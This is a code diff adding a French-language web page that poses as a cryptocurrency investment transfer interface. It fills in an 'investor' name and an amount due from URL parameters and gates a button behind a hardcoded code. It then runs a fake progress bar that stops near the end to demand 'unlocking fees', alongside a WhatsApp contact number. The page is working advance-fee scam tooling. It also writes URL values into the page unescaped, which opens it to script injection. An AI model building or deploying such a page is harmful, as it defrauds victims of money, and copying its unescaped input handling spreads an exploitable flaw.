@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interface de transfert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .background-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('./nano.png'); 
+            background-size: cover;
+            z-index: -1; 
+        }
+
+        body {
+            background-color: #000000; /* Fond sombre pour le texte */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100vw;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+
+        .interface {
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.7); /* Augmenter l'opacité */
+            color: #14151A; /* Couleur du texte */
+            border-radius: 30px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+            max-width: 90%;
+            width: 600px;
+            z-index: 1;
+        }
+
+        .transfer-text {
+            font-size: 16px;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .progress-bar {
+            width: 100%;
+            max-width: 800px;
+            height: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+            margin: 0 auto;
+        }
+
+        .progress {
+            height: 100%;
+            width: 0;
+            background-color: #F0B90B; /* Couleur de la barre de progression */
+            border-radius: 10px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            transition: width 1s ease;
+            z-index: 1; 
+        }
+
+        .progress-percent {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2; 
+            color: #000; /* Couleur du texte dans la barre de progression */
+        }
+
+        .button {
+            background-color: #F0B90B; /* Couleur du bouton "Démarrer l'investissement" */
+            color: #14151A; /* Couleur du texte du bouton */
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-block;
+            margin: 10px;
+        }
+
+        .button:hover {
+            background-color: #d1a000; /* Couleur au survol */
+        }
+
+        .whatsapp-button {
+            background-color: #25D366; /* Couleur du bouton WhatsApp */
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-block;
+            margin: 10px;
+        }
+
+        .whatsapp-button:hover {
+            background-color: #1DA851; /* Couleur au survol du bouton WhatsApp */
+        }
+
+        .top-left-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 80px;
+            height: auto;
+            margin-top: 35px;
+        }
+    </style>
+</head>
+<body>
+    <div id="investor-info" class="interface"></div>
+    <div class="background-image"></div>
+    <div class="interface">   
+        <div class="transfer-text"></div>
+        <div class="transfer-text"></div>
+        <div class="transfer-text"></div>
+        <div class="transfer-text"></div>
+        <div class="transfer-text" style="color:rgb(0, 255, 21)" id="invest">En attente des fonds d'investissement</div>
+        <div class="progress-bar">
+            <div class="progress" data-percent="0"></div>
+            <div class="progress-percent">0%</div>
+        </div><br>
+        <div><p style="color: #8B0000; font-weight: bold;" id="alert-msg"></p></div>  
+        <div class="transfer-text"></div>
+        <input type="button" value="Démarrer l'investissement" class="button" id="btn-deblock">
+        <input type="button" value="WhatsApp" class="whatsapp-button" id="btn-whatsapp" onclick="window.open('https://wa.me/16263231795', '_blank');">
+        <input type="button" value="Recevoir mes bénéfices" class="button" id="btn-receive" style="display: none;">
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const investorName = urlParams.get('investorName');
+        const transactionNumber = urlParams.get('transactionNumber');
+        const network = urlParams.get('network');
+        const totalAmount = urlParams.get('totalAmount');
+        const alertMessage = urlParams.get('alertMessage');
+
+        document.getElementById('investor-info').innerHTML = `
+            <div class="transfer-text">Nom de l'investisseur : ${investorName}</div>
+            <div class="transfer-text">Numéro de transaction : ${transactionNumber}</div>
+            <div class="transfer-text">Réseau utilisé : ${network}</div>
+            <div class="transfer-text">Montant total à recevoir : ${totalAmount}</div>
+        `;
+
+        document.querySelector('#btn-deblock').addEventListener('click', () => {
+            let code2 = prompt("Veuillez entrer le code de suivi de votre investissement");
+            if (code2 == "2021") {
+                interval = setInterval(progress, 750);
+                document.querySelector('#invest').innerText = "En cours d'investissement...";
+                document.querySelector('#btn-deblock').style.display = 'none';
+                document.querySelector('#btn-receive').style.display = 'inline-block';
+            } else {
+                alert("Code incorrect");
+            }
+        });
+
+        document.querySelector('#btn-receive').addEventListener('click', () => {
+            alert('Veuillez payer les frais demandés');
+        });
+
+        const progressBar = document.querySelector('.progress');
+        const progressPercent = document.querySelector('.progress-percent');
+        let percent = 0;
+        let interval;
+
+        function progress() {
+            if (percent <= 99) {
+                progressBar.style.width = percent + '%';
+                progressPercent.textContent = percent + '%';
+                percent++;
+            } else {
+                clearInterval(interval);
+            }
+
+            if (percent == 97) {
+                document.querySelector('#alert-msg').innerText = 'Alerte : Mr/Mme ' + investorName + ' veuillez payer les frais de déblocage afin de recevoir immédiatement vos bénéfices dans les 15 minutes.';
+            }
+        }
+    </script>
+</body>
+</html>
